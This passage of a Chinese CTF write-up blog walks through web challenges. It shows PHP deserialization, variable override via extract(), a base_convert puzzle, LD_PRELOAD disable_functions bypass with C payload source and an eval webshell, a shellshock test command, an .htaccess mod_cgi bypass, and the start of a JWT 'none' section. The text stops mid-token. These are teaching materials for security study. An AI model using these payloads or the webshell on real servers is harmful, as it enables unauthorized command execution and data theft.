class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">var</span> t = [<span class="hljs-string">&#x27;fl&#x27;</span>, <span class="hljs-string">&#x27;s_a&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;e&#125;&#x27;</span>];<br>                        <span class="hljs-keyword">var</span> n = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;_h0l&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>];<br>                        <span class="hljs-keyword">var</span> r = [<span class="hljs-string">&#x27;g&#123;&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;_0&#x27;</span>];<br>                        <span class="hljs-keyword">var</span> i = [<span class="hljs-string">&#x27;it\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>];<br>                        <span class="hljs-keyword">var</span> s = [t, n, r, i];<br>                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>                            <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);<br>                            s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);<br><span class="hljs-keyword">delete</span> _;<br></code></pre></td></tr></table></figure><p>代码审计的话 就要懂正则表达式了 ^表示匹配开头 $表示匹配末尾</p><p>多个if下来得到payload:<code>be0f23233ace98aa</code> 放到输入框得到flag 但是我没有成功</p><p>放到控制台也尝试了 原因未明</p><p>那么就直接跳过if 将下面代码放到控制台</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> t = [<span class="hljs-string">&quot;fl&quot;</span>, <span class="hljs-string">&quot;s_a&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;e&#125;&quot;</span>];<br><span class="hljs-keyword">var</span> n = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;_h0l&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];<br><span class="hljs-keyword">var</span> r = [<span class="hljs-string">&quot;g&#123;&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_0&quot;</span>];<br><span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];<br><span class="hljs-keyword">var</span> s = [t, n, r, i];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>    <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);<br>    s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)；<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210623183118168.png"></p><h2 id="BUU-CODE-REVIEW"><a href="#BUU-CODE-REVIEW" class="headerlink" title="BUU CODE REVIEW"></a>BUU CODE REVIEW</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;correct = base64_encode(uniqid());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;correct === <span class="hljs-keyword">$this</span>-&gt;input) &#123;<br>               <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pleaseget&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pleasepost&#x27;</span>] === <span class="hljs-string">&#x27;2&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>]) == md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &#123;<br>            unserialize(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;obj&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先有unserialize参数通过POST变量obj，即参数可控，其次类已经给出，可以利用，最后，类中有魔术方法__destruct 说明这是一道考查了反序列化知识点的题 </p><p>题中函数讲解：uniqid()：基于以微秒计的当前时间，生成一个唯一id</p><p>MD5的==比较，可以使用哈希比较缺陷和数组绕过</p><p>条件$this-&gt;correct === $this-&gt;input构造传引用：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$a</span>-&gt;<span class="hljs-variable">$input</span>=<span class="hljs-variable">$a</span>-&gt;<span class="hljs-variable">$correct</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;correct = base64_encode(uniqid());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;correct === <span class="hljs-keyword">$this</span>-&gt;input) &#123;<br>              <span class="hljs-comment">//echo file_get_contents(&quot;/flag&quot;);</span><br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> BUU();<br><span class="hljs-variable">$a</span>-&gt;input=&amp;a-&gt;correct;<span class="hljs-comment">//传引用</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//得到：O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;s:0:&quot;&quot;;&#125; </span><br></code></pre></td></tr></table></figure><p>拼接payload即可</p><h2 id="abcd"><a href="#abcd" class="headerlink" title="abcd"></a>abcd</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ygnn_bpkn&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ygnn_bpkn.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|show_source|GLOBALS|echo|var_dump|print|highlight_file|GET|eval/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;lueluelue&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>非预期解：</p><blockquote><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fun=system($_POST[a])&amp;a=tac flag.php</p><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fun=system($_POST[a])&amp;a=tac flag2.php</p></blockquote></blockquote><p>题目本意是<code>fl0g=flag_give_me</code>输出flag，很显然<code>fl0g</code>传入的方式是GET，但是要想这样赋值前的if条件又是通过GET传入空值<code>fl0g</code> 总之这就是个死局</p><p>我们可以通过变量覆盖的方式，也是这题的考查点，利用变量c和extract()做跳板，给<code>fl0g</code>类似参数逃逸的方式赋值</p><blockquote><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>该函数返回成功设置的变量数目。</p><p>extract(<strong>array</strong>,extract_rules,prefix)</p></blockquote><blockquote><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fl0g=flag_give_me&amp;fun=extract($_POST)</p></blockquote><p>然后访问robots.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag2.php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$F</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;F&#x27;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/system|nl|tac|tee|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="hljs-variable">$F</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(substr(<span class="hljs-variable">$F</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;come&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>应是环境问题，解法应该是curl -F，此处<code>?F=\`$F `;vi flag2.php</code>没有响应 尝试了其他命令也是如此</p><p>至此此题解</p><p>值得注意的是<code>$a=$_SERVER[&#39;argv&#39;];</code>被注释了，否则存在解法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]当前传递给PHP程序的参数<br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>][<span class="hljs-number">0</span>];<br>当我们传值 ?<span class="hljs-variable">$fl0g</span>=flag_give_me; (一定要加上分号；)然后此时<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span>并不是直接GET fl0g，<br>在使用<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>])，来执行<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span>，达到赋值的目的<br>最后 <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>)<br><br>GET: ?<span class="hljs-variable">$fl0g</span>=flag_give_me;<br>POST: ygnn_bpkn=<span class="hljs-number">1</span>&amp;ygnn[bpkn.COM=<span class="hljs-number">2</span>&amp;fun=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><h2 id="def"><a href="#def" class="headerlink" title="def"></a>def</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&#x27;/eval|system|usort|array|include|shell_exec|exec|call|function|replace|uasort/i&#x27;</span>,<span class="hljs-variable">$a</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/&#x27;</span>,<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不要字母&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$f</span> = <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/&#x27;</span>,<span class="hljs-variable">$d</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;都说了不要字母&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>];<br>        <span class="hljs-variable">$g</span> = <span class="hljs-variable">$f</span>(<span class="hljs-variable">$e</span>(<span class="hljs-variable">$d</span>));<br>        <span class="hljs-variable">$caicai</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;caicai&#x27;</span>];<br>        <span class="hljs-variable">$cc</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cc&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/abc|def|caicai|cc/&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;h&#x27;</span>]))<br>        &#123;<br>            <span class="hljs-variable">$h</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;h&#x27;</span>].<span class="hljs-string">&#x27;;&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不要使用敏感函数&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><blockquote><p>base_convert(<strong>number,frombase,tobase</strong>);在任意进制之间转换数字</p></blockquote><p>先说非预期解：扫目录发现<code>.DS_Store</code>，工具解开发现<code>flagaaaaaaaaaa.txt</code>，访问即可</p><h2 id="Bypass-disable-function-——-LD-PRELOAD"><a href="#Bypass-disable-function-——-LD-PRELOAD" class="headerlink" title="Bypass disable_function —— LD_PRELOAD"></a>Bypass disable_function —— LD_PRELOAD</h2><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime  linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;cat /flag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>system(<span class="hljs-string">&quot;tac /flag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>system(<span class="hljs-string">&quot;/readflag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>&#125;   <br><span class="hljs-function"><span class="hljs-keyword">int</span>  <span class="hljs-title">geteuid</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>gcc -c -fPIC hack.c -o hack<br>gcc -shared hack -o hack.so</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ant&#x27;</span>]);<br>  putenv(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>);<br>  error_log(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-number">1</span>);<br>  mail(<span class="hljs-string">&quot;admin@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>putenv()用来改变或增加环境变量的内容. 参数string 的格式为name＝value, 如果该环境变量原先存在, 则变量内容会依参数string 改变, 否则此参数内容会成为新的环境变量.</p></blockquote><p>浏览器访问shell.php，再访问test.php,即可发现flag</p><p>利用蚁剑插件可以免去上述过程 如下题：</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729142924840.png"></p><p>蚁剑连接</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729143019466.png"></p><p>直接查看flag文件为空 下载文件得到没权限</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729143920521.png"></p><p>终端始终返回127  这是运行环境和登录用户的运行环境存在差异造成的 这样设置就是权限不够</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729143100697.png"></p><p>在蚁剑使用插件绕过disable_function，成功后可以看到 <code>/var/www/html/</code> 目录下新建了一个 <code>.antproxy.php</code> 文件</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729154051090.png"></p><p>改用.antproxy.php连接蚁剑 即可绕过</p><h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>ShellShock,破壳漏洞，出现于2014年<br> 可以通过以下命令来判断是否存在这个漏洞<br> <code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br> 如果出现vulnerable说明存在</p><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p>需要用到.htaccess和mod_cgi</p><p>1）.htaccess</p><p>一般情况下，不应该使用.htaccess文件，除非你对主配置文件没有访问权限；.htaccess文件应该被用在内容提供者需要针对特定目录改变服务器的配置而又没有root权限的情况下。如果服务器管理员不愿意频繁修改配置，则可以允许用户通过.htaccess文件自己修改配置，尤其是ISP在同一个机器上运行了多个用户站点，而又希望用户可以自己改变配置的情况下。</p><p>2）mod_cgi</p><p>在非线程型MPM(<code>prefork</code>)上提供对CGI脚本执行的支持</p><p>任何具有MIME类型<code>application/x-httpd-cgi</code>或者被<code>cgi-script</code>处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由<code>AddType</code>指令定义的扩展名，另一种是文件位于<code>ScriptAlias</code>目录中。如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令</p><p>需要满足几个条件:</p><p>第一，必须是apache环境<br>第二，mod_cgi已经启用<br>第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none<br>第四，必须有权限写.htaccess文件</p><p>.htaccess内容：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Options +ExecCGI<br>AddHandler cgi-script <span class="hljs-string">.abc</span><span class="hljs-comment">#这里的.abc是构造的，表示.abc后缀的文件都会被当作cgi脚本执行</span><br><br>shell.abc<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-keyword">echo</span>&amp;&amp;<span class="hljs-keyword">cd</span> <span class="hljs-string">&quot;/var/www/html&quot;</span>;<span class="hljs-keyword">ls</span> -al;<span class="hljs-keyword">echo</span> [S];<span class="hljs-keyword">pwd</span>;<span class="hljs-keyword">echo</span> [E]<br></code></pre></td></tr></table></figure><p>注解：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Options</span>指令是Apache配置文件中一个比较常见也比较重要的指令，<span class="hljs-keyword">Options</span>指令可以在Apache服务器核心配置(<span class="hljs-keyword">server</span> config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用。<span class="hljs-keyword">Options</span>指令的主要作用是控制特定目录将启用哪些服务器特性。<br>关于<span class="hljs-keyword">Options</span>指令后可以附加的特性选项的具体作用及含义，可以参考这篇文章：http://www<span class="hljs-number">.365</span>mini.com/page/apache-<span class="hljs-keyword">options</span>-directive.htm<br>当然我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本<br></code></pre></td></tr></table></figure><p>利用蚁剑的插件即可</p><h2 id="JSON-Web-Token"><a href="#JSON-Web-Token" class="headerlink" title="JSON Web Token"></a>JSON Web Token</h2><h3 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h3><p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819003224592.png"></p><p>抓包得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">token</span>=eyJ<span class="hljs-number">0</span>eXAiOiJKV<span class="hljs-number">1</span>QiLCJhbGciOiJIUzI<span class="hljs-number">1</span>NiJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>IjEyMyIsInBhc<span class="hljs-number">3</span>N<span class="hljs-number">3</span>b<span class="hljs-number">3</span>JkIjoiMTIzIiwicm<span class="hljs-number">9</span>sZSI<span class="hljs-number">6</span>Imd<span class="hljs-number">1</span>ZXN<span 